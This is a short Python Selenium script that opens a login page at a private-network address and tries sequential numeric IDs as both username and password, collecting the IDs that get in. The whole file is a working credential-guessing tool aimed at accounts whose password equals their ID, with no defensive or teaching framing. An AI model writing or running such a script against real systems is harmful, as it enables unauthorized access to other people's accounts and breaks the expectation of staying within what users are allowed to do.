from selenium import webdriver
import time
browser = webdriver.Firefox()
browser.get('http://10.100.56.55:8090')
print ("browser opened")
stack = [0]
username = browser.find_element_by_css_selector('#usernametxt > td:nth-child(1) > input:nth-child(1)')
password = browser.find_element_by_css_selector('.tablecss > table:nth-child(1) > tbody:nth-child(1) > tr:nth-child(4) > td:nth-child(1) > input:nth-child(1)')
enter = browser.find_element_by_css_selector('#logincaption')
n = 201221000
for num in range(1,30): 
    n+=1
    username.send_keys(str(n))    
    password.send_keys(str(n))       
    enter.click()
    time.sleep(1) 
    try:
    	msg = browser.find_element_by_css_selector('.note > xmp:nth-child(1)')
    except:
    	try:
    		msg = browser.find_element_by_css_selector('.errorfont > xmp:nth-child(1)')
    	except:
    		print("Error")
    if msg.text == 'The system could not log you on. Make sure your password is correct':
        username.clear()
    else :
    	print(n)
    	stack.append(n)
    	enter.click()
print(stack)
